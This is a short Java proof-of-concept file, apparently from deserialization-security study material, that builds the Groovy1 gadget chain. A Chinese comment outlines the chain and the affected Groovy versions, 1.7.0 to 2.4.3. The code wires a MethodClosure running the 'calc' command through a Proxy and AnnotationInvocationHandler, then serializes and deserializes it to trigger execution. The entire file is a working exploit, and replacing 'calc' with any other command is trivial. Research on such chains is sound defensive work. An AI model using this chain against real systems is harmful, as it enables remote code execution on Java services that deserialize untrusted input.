import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Map;

import static util.Util.serialize;
import static util.Util.unserialize;
/*
构造链:
AnnotationInvocationHandler.readObject()
    Map.entrySet() (Proxy)
        ConversionHandler.invoke()
            ConvertedClosure.invokeCustom()
		        MethodClosure.call()
                    ProcessGroovyMethods.execute()
版本依赖:Groovy : 1.7.0-2.4.3
* */
public class Groovy1 {
    public static void main(String[] args) throws Exception{
        MethodClosure methodClosure=new MethodClosure("calc","execute");
        ConvertedClosure closure = new ConvertedClosure(methodClosure,"entrySet");
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor= c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),
                new Class[]{Map.class},closure
        );
        InvocationHandler invocationHandler=(InvocationHandler) constructor.newInstance(Target.class,handler);
        serialize(invocationHandler);
        unserialize();
    }
}
